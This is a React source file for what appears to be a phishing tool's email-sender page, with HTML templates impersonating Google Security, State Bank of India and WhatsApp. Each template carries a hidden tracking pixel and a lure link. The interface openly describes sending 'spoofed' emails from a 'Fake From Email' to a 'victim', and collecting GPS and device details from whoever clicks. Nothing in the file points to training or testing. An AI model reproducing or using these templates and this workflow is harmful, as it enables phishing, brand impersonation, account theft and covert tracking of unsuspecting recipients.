import React, { useState, useEffect } from "react";
import { useAuth } from "../contexts/AuthContext";
import { db } from "../firebase/config";
import { collection, query, where, onSnapshot } from "firebase/firestore";
import {
  Mail, Send, Copy, CheckCircle, AlertCircle,
  ChevronDown, Eye, Link2, Shield
} from "lucide-react";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

const EMAIL_TEMPLATES = [
  {
    name: "Google Security Alert",
    fromName: "Google Security",
    fromEmail: "security@accounts.google.com",
    subject: "⚠️ Suspicious sign-in attempt on your Google Account",
    body: (pixelUrl, trackingUrl) => `
<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:20px">
  <div style="text-align:center;margin-bottom:24px">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" width="120" alt="Google" />
  </div>
  <h2 style="color:#202124;font-size:20px">New sign-in to your Google Account</h2>
  <p style="color:#5f6368;font-size:14px">Your Google Account was just signed in from a new device:</p>
  <div style="background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px;margin:16px 0">
    <p style="margin:0;color:#202124;font-size:14px"><strong>Device:</strong> Unknown Device</p>
    <p style="margin:8px 0 0;color:#202124;font-size:14px"><strong>Location:</strong> Unknown Location</p>
    <p style="margin:8px 0 0;color:#202124;font-size:14px"><strong>Time:</strong> ${new Date().toLocaleString()}</p>
  </div>
  <p style="color:#5f6368;font-size:14px">If this was you, you can ignore this email. If not, secure your account immediately.</p>
  <div style="text-align:center;margin:24px 0">
    <a href="${trackingUrl}" style="background:#1a73e8;color:#fff;padding:12px 32px;border-radius:4px;text-decoration:none;font-size:14px;font-weight:500">
      Review Activity
    </a>
  </div>
  <p style="color:#9aa0a6;font-size:12px;text-align:center">Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043</p>
  <img src="${pixelUrl}" width="1" height="1" border="0" alt="" style="display:none!important;visibility:hidden;width:1px;height:1px;" />
</div>`,
  },
  {
    name: "Bank Alert",
    fromName: "SBI Security",
    fromEmail: "alerts@sbi.co.in",
    subject: "🔔 Alert: Your account has been temporarily locked",
    body: (pixelUrl, trackingUrl) => `
<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:20px">
  <div style="background:#22409a;padding:16px;text-align:center;border-radius:8px 8px 0 0">
    <h2 style="color:#fff;margin:0;font-size:22px">State Bank of India</h2>
  </div>
  <div style="border:1px solid #ddd;border-top:none;padding:24px;border-radius:0 0 8px 8px">
    <p style="color:#d93025;font-weight:bold">⚠️ Security Alert</p>
    <p style="color:#333;font-size:14px">Dear Customer,</p>
    <p style="color:#333;font-size:14px">We have detected unusual activity on your account. Your account has been temporarily locked for your security.</p>
    <p style="color:#333;font-size:14px">To restore access and verify your identity, please click the button below:</p>
    <div style="text-align:center;margin:24px 0">
      <a href="${trackingUrl}" style="background:#22409a;color:#fff;padding:12px 32px;border-radius:4px;text-decoration:none;font-size:14px;font-weight:500">
        Verify My Account
      </a>
    </div>
    <p style="color:#999;font-size:12px">If you did not initiate this request, please contact our helpline immediately at 1800-11-2211.</p>
    <p style="color:#999;font-size:11px">© State Bank of India. This is an automated message, please do not reply.</p>
  </div>
  <img src="${pixelUrl}" width="1" height="1" border="0" alt="" style="display:none!important;visibility:hidden;width:1px;height:1px;" />
</div>`,
  },
  {
    name: "WhatsApp Verification",
    fromName: "WhatsApp",
    fromEmail: "verify@whatsapp.com",
    subject: "Your WhatsApp account has been suspended",
    body: (pixelUrl, trackingUrl) => `
<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:20px">
  <div style="text-align:center;margin-bottom:20px">
    <div style="background:#25D366;width:60px;height:60px;border-radius:50%;margin:0 auto;display:flex;align-items:center;justify-content:center">
      <span style="color:#fff;font-size:32px">✓</span>
    </div>
    <h2 style="color:#333;margin-top:12px">WhatsApp</h2>
  </div>
  <h3 style="color:#d93025;text-align:center">Account Suspended</h3>
  <p style="color:#555;font-size:14px;text-align:center">Your WhatsApp account has been suspended due to a violation of our Terms of Service.</p>
  <p style="color:#555;font-size:14px;text-align:center">To appeal this decision and restore your account, please verify your identity:</p>
  <div style="text-align:center;margin:24px 0">
    <a href="${trackingUrl}" style="background:#25D366;color:#fff;padding:12px 32px;border-radius:24px;text-decoration:none;font-size:14px;font-weight:600">
      Appeal & Restore Account
    </a>
  </div>
  <p style="color:#999;font-size:12px;text-align:center">If you believe this is a mistake, submit an appeal within 24 hours.</p>
  <img src="${pixelUrl}" width="1" height="1" border="0" alt="" style="display:none!important;visibility:hidden;width:1px;height:1px;" />
</div>`,
  },
  {
    name: "Custom Email",
    fromName: "",
    fromEmail: "",
    subject: "",
    body: (pixelUrl, trackingUrl) => `<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px">
  <h2>Write your email here</h2>
  <p>Add your content...</p>
  <a href="${trackingUrl}">Click here</a>
  <img src="${pixelUrl}" width="1" height="1" style="display:none" />
</div>`,
  },
];

export default function EmailSender() {
  const { currentUser } = useAuth();
  const [pixels, setPixels] = useState([]);
  const [trackingLinks, setTrackingLinks] = useState([]);
  const [selectedTemplate, setSelectedTemplate] = useState(0);
  const [fromName, setFromName] = useState(EMAIL_TEMPLATES[0].fromName);
  const [fromEmail, setFromEmail] = useState(EMAIL_TEMPLATES[0].fromEmail);
  const [toEmail, setToEmail] = useState("");
  const [subject, setSubject] = useState(EMAIL_TEMPLATES[0].subject);
  const [selectedPixel, setSelectedPixel] = useState("");
  const [selectedTrackingLink, setSelectedTrackingLink] = useState("");
  const [htmlBody, setHtmlBody] = useState("");
  const [sending, setSending] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [showPreview, setShowPreview] = useState(false);
  const [copiedId, setCopiedId] = useState(null);

  // Load pixels and tracking links
  useEffect(() => {
    if (!currentUser) return;
    const q1 = query(collection(db, "pixelLinks"), where("uid", "==", currentUser.uid));
    const unsub1 = onSnapshot(q1, snap => {
      setPixels(snap.docs.map(d => ({ id: d.id, ...d.data() })));
    });
    const q2 = query(collection(db, "trackingLinks"), where("uid", "==", currentUser.uid));
    const unsub2 = onSnapshot(q2, snap => {
      setTrackingLinks(snap.docs.map(d => ({ id: d.id, ...d.data() })));
    });
    return () => { unsub1(); unsub2(); };
  }, [currentUser]);

  // Generate body from template when selections change
  useEffect(() => {
    const template = EMAIL_TEMPLATES[selectedTemplate];
    const pixelUrl = pixels.find(p => p.id === selectedPixel)?.pixelUrl || "PIXEL_URL_HERE";
    const trackingUrl = trackingLinks.find(l => l.id === selectedTrackingLink)?.trackingUrl || "TRACKING_URL_HERE";
    setHtmlBody(template.body(pixelUrl, trackingUrl));
  }, [selectedTemplate, selectedPixel, selectedTrackingLink, pixels, trackingLinks]);

  function handleTemplateChange(idx) {
    setSelectedTemplate(idx);
    const t = EMAIL_TEMPLATES[idx];
    setFromName(t.fromName);
    setFromEmail(t.fromEmail);
    setSubject(t.subject);
  }

  async function handleSend(e) {
    e.preventDefault();
    if (!toEmail.trim()) { setError("Enter target email address"); return; }
    if (!subject.trim()) { setError("Enter email subject"); return; }
    setSending(true); setError(""); setSuccess("");
    try {
      const res = await fetch(BACKEND_URL + "/api/links/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ fromName, fromEmail, toEmail, subject, htmlBody }),
      });
      const data = await res.json();
      if (data.error) throw new Error(data.error);
      setSuccess(`Email sent successfully to ${toEmail}! Tracking pixel will fire when they open it.`);
      setToEmail("");
    } catch (err) {
      setError(err.message || "Failed to send email");
    }
    setSending(false);
  }

  function copy(text, id) {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  }

  return (
    <div className="min-h-screen bg-surface pt-16 text-text-primary">
      <div className="max-w-5xl mx-auto px-4 py-8">

        <div className="mb-8">
          <h1 className="font-display text-4xl tracking-wider">EMAIL <span className="text-primary">SENDER</span></h1>
          <p className="font-body text-sm text-text-secondary mt-1">
            Send spoofed tracking emails with embedded pixel + tracking link. Target sees a fake sender name.
          </p>
        </div>

        {/* Info banner */}
        <div className="bg-primary/10 border border-primary/30 rounded-xl p-4 mb-6 flex items-start gap-3">
          <Shield className="w-5 h-5 text-primary flex-shrink-0 mt-0.5" />
          <div>
            <p className="font-body text-sm text-primary font-semibold">How this works</p>
            <p className="font-body text-xs text-text-secondary mt-1">
              Email is sent from your SMTP but the <strong>display name</strong> shows as "Google Security" or any name you choose.
              The pixel fires on <strong>open</strong> (no click needed). The tracking link fires on <strong>click</strong> (gets full GPS + 300+ details).
            </p>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">

          {/* Left — Compose */}
          <div className="space-y-4">

            {/* Template picker */}
            <div className="bg-surface-elevated border border-surface-border rounded-2xl p-5">
              <h2 className="font-display text-lg tracking-wider mb-4">1. CHOOSE <span className="text-primary">TEMPLATE</span></h2>
              <div className="grid grid-cols-2 gap-2">
                {EMAIL_TEMPLATES.map((t, i) => (
                  <button
                    key={i}
                    onClick={() => handleTemplateChange(i)}
                    className={`p-3 rounded-xl border text-left transition-all font-body text-xs ${selectedTemplate === i
                      ? "border-primary bg-primary/10 text-primary"
                      : "border-surface-border text-text-muted hover:border-primary/40"}`}
                  >
                    <div className="font-semibold">{t.name}</div>
                    {t.fromName && <div className="text-text-muted mt-0.5">From: {t.fromName}</div>}
                  </button>
                ))}
              </div>
            </div>

            {/* Sender & target */}
            <div className="bg-surface-elevated border border-surface-border rounded-2xl p-5">
              <h2 className="font-display text-lg tracking-wider mb-4">2. CONFIGURE <span className="text-primary">SENDER</span></h2>
              <div className="space-y-3">
                <div>
                  <label className="font-body text-xs text-text-muted uppercase tracking-wider mb-1.5 block">Display Name (target sees this)</label>
                  <input
                    value={fromName}
                    onChange={e => setFromName(e.target.value)}
                    placeholder="e.g. Google Security, SBI Bank"
                    className="w-full bg-surface border border-surface-border rounded-xl px-4 py-3 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
                  />
                </div>
                <div>
                  <label className="font-body text-xs text-text-muted uppercase tracking-wider mb-1.5 block">Fake From Email (shown in reply-to)</label>
                  <input
                    value={fromEmail}
                    onChange={e => setFromEmail(e.target.value)}
                    placeholder="e.g. security@google.com"
                    className="w-full bg-surface border border-surface-border rounded-xl px-4 py-3 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
                  />
                </div>
                <div>
                  <label className="font-body text-xs text-text-muted uppercase tracking-wider mb-1.5 block">Subject Line</label>
                  <input
                    value={subject}
                    onChange={e => setSubject(e.target.value)}
                    placeholder="Email subject"
                    className="w-full bg-surface border border-surface-border rounded-xl px-4 py-3 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
                  />
                </div>
                <div>
                  <label className="font-body text-xs text-text-muted uppercase tracking-wider mb-1.5 block">Target Email Address</label>
                  <input
                    value={toEmail}
                    onChange={e => setToEmail(e.target.value)}
                    placeholder="victim@email.com"
                    className="w-full bg-surface border border-surface-border rounded-xl px-4 py-3 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
                  />
                </div>
              </div>
            </div>

            {/* Select pixel and tracking link */}
            <div className="bg-surface-elevated border border-surface-border rounded-2xl p-5">
              <h2 className="font-display text-lg tracking-wider mb-4">3. ATTACH <span className="text-primary">TRACKERS</span></h2>
              <div className="space-y-3">
                <div>
                  <label className="font-body text-xs text-text-muted uppercase tracking-wider mb-1.5 flex items-center gap-2">
                    <Eye className="w-3.5 h-3.5" /> Tracking Pixel (fires on open)
                  </label>
                  <select
                    value={selectedPixel}
                    onChange={e => setSelectedPixel(e.target.value)}
                    className="w-full bg-surface border border-surface-border rounded-xl px-4 py-3 font-body text-sm text-text-primary focus:outline-none focus:border-primary cursor-pointer"
                  >
                    <option value="">— No pixel (open tracking disabled) —</option>
                    {pixels.map(p => (
                      <option key={p.id} value={p.id}>{p.label} ({p.totalOpens || 0} opens)</option>
                    ))}
                  </select>
                  {pixels.length === 0 && (
                    <p className="font-body text-xs text-yellow-400 mt-1">⚠️ No pixels yet — create one in Pixel Tracker first</p>
                  )}
                </div>
                <div>
                  <label className="font-body text-xs text-text-muted uppercase tracking-wider mb-1.5 flex items-center gap-2">
                    <Link2 className="w-3.5 h-3.5" /> Tracking Link (fires on click — gets GPS + full details)
                  </label>
                  <select
                    value={selectedTrackingLink}
                    onChange={e => setSelectedTrackingLink(e.target.value)}
                    className="w-full bg-surface border border-surface-border rounded-xl px-4 py-3 font-body text-sm text-text-primary focus:outline-none focus:border-primary cursor-pointer"
                  >
                    <option value="">— No tracking link (click tracking disabled) —</option>
                    {trackingLinks.map(l => (
                      <option key={l.id} value={l.id}>{l.label} → {l.destinationUrl}</option>
                    ))}
                  </select>
                  {trackingLinks.length === 0 && (
                    <p className="font-body text-xs text-yellow-400 mt-1">⚠️ No tracking links — create one in Dashboard first</p>
                  )}
                </div>
              </div>
            </div>

            {/* Send button */}
            <div className="bg-surface-elevated border border-surface-border rounded-2xl p-5">
              <h2 className="font-display text-lg tracking-wider mb-4">4. <span className="text-primary">SEND</span></h2>

              {error && (
                <div className="flex items-center gap-2 bg-red-500/10 border border-red-500/30 text-red-400 rounded-lg px-3 py-2.5 font-body text-sm mb-4">
                  <AlertCircle className="w-4 h-4 flex-shrink-0" />{error}
                </div>
              )}
              {success && (
                <div className="flex items-center gap-2 bg-green-500/10 border border-green-500/30 text-green-400 rounded-lg px-3 py-2.5 font-body text-sm mb-4">
                  <CheckCircle className="w-4 h-4 flex-shrink-0" />{success}
                </div>
              )}

              <div className="flex gap-3">
                <button
                  onClick={handleSend}
                  disabled={sending}
                  className="flex-1 px-6 py-3.5 bg-primary text-surface font-body font-bold rounded-xl hover:bg-primary-dark transition-all shadow-glow disabled:opacity-50 flex items-center justify-center gap-2"
                >
                  <Send className="w-4 h-4" />
                  {sending ? "Sending..." : "Send Tracking Email"}
                </button>
                <button
                  onClick={() => setShowPreview(!showPreview)}
                  className="px-4 py-3.5 bg-surface border border-surface-border rounded-xl font-body text-sm text-text-primary hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center gap-2"
                >
                  <Eye className="w-4 h-4" />
                  {showPreview ? "Hide" : "Preview"}
                </button>
              </div>
            </div>
          </div>

          {/* Right — Preview */}
          <div className="space-y-4">
            <div className="bg-surface-elevated border border-surface-border rounded-2xl p-5">
              <div className="flex items-center justify-between mb-4">
                <h2 className="font-display text-lg tracking-wider">EMAIL <span className="text-primary">PREVIEW</span></h2>
                <button
                  onClick={() => copy(htmlBody, "html")}
                  className="flex items-center gap-1.5 px-3 py-1.5 bg-surface border border-surface-border rounded-lg font-body text-xs hover:bg-primary/10 transition-colors"
                >
                  {copiedId === "html" ? <><CheckCircle className="w-3 h-3 text-green-400" /> Copied!</> : <><Copy className="w-3 h-3" /> Copy HTML</>}
                </button>
              </div>

              {/* Email meta */}
              <div className="bg-surface border border-surface-border rounded-xl p-3 mb-4 space-y-2">
                <div className="flex items-center gap-2">
                  <span className="font-body text-xs text-text-muted w-16">From:</span>
                  <span className="font-mono text-xs text-text-primary">{fromName || "—"} &lt;{fromEmail || "your-smtp"}&gt;</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="font-body text-xs text-text-muted w-16">To:</span>
                  <span className="font-mono text-xs text-text-primary">{toEmail || "target@email.com"}</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="font-body text-xs text-text-muted w-16">Subject:</span>
                  <span className="font-mono text-xs text-text-primary">{subject || "—"}</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="font-body text-xs text-text-muted w-16">Pixel:</span>
                  <span className={`font-mono text-xs ${selectedPixel ? "text-green-400" : "text-text-muted"}`}>
                    {selectedPixel ? "✓ Embedded — fires on open" : "✗ Not attached"}
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="font-body text-xs text-text-muted w-16">Link:</span>
                  <span className={`font-mono text-xs ${selectedTrackingLink ? "text-green-400" : "text-text-muted"}`}>
                    {selectedTrackingLink ? "✓ Embedded — fires on click" : "✗ Not attached"}
                  </span>
                </div>
              </div>

              {/* HTML preview */}
              <div className="border border-surface-border rounded-xl overflow-hidden" style={{ height: 400 }}>
                <iframe
                  title="email-preview"
                  srcDoc={htmlBody}
                  style={{ width: "100%", height: "100%", border: "none", background: "#fff" }}
                />
              </div>
            </div>

            {/* HTML source */}
            <div className="bg-surface-elevated border border-surface-border rounded-2xl p-5">
              <div className="flex items-center justify-between mb-3">
                <h2 className="font-display text-lg tracking-wider">HTML <span className="text-primary">SOURCE</span></h2>
                <button
                  onClick={() => setShowPreview(!showPreview)}
                  className="font-body text-xs text-text-muted hover:text-primary transition-colors"
                >
                  {showPreview ? "Hide" : "Show"} source
                </button>
              </div>
              {showPreview && (
                <div className="relative">
                  <pre className="bg-surface border border-surface-border rounded-xl p-4 font-mono text-xs text-green-400 overflow-x-auto max-h-60 whitespace-pre-wrap break-all">
                    {htmlBody}
                  </pre>
                  <button
                    onClick={() => copy(htmlBody, "src")}
                    className="absolute top-3 right-3 flex items-center gap-1.5 px-3 py-1.5 bg-surface-border rounded-lg font-body text-xs hover:bg-primary/20 transition-colors"
                  >
                    {copiedId === "src" ? <><CheckCircle className="w-3 h-3 text-green-400" /> Copied!</> : <><Copy className="w-3 h-3" /> Copy</>}
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}